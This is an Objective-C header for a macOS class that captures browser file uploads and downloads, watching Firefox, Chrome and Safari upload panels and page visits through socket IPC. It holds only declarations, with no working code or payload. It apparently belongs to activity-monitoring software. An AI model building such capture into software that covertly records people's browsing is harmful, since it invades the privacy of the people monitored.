//
//  InternetFileUploadDownloadCapture.h
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

#import "SocketIPCReader.h"
#import "PageVisitedDelegate.h"

@class FirefoxGetInfo, BrowserUploadFilePanelMonitor, PageVisitedNotifier;

@interface InternetFileUploadDownloadCapture : NSObject <SocketIPCDelegate, PageVisitedDelegate> {
    NSOperationQueue    *mQueue;
    NSThread            *mThread;
    SocketIPCReader     *mIFTSocketReader;
    
    BrowserUploadFilePanelMonitor *mFireFoxPanelMonitor;
    BrowserUploadFilePanelMonitor *mChromePanelMonitor;
    BrowserUploadFilePanelMonitor *mSafariPanelMonitor;
    
    PageVisitedNotifier *mPageNotifier;
    
    id  mDelegate;
    SEL mSelector;
}

@property (nonatomic, readonly) NSOperationQueue *mQueue;
@property (nonatomic, assign) NSThread *mThread;

@property (nonatomic, assign) id mDelegate;
@property (nonatomic, assign) SEL mSelector;

- (void) startCapture;
- (void) stopCapture;

@end
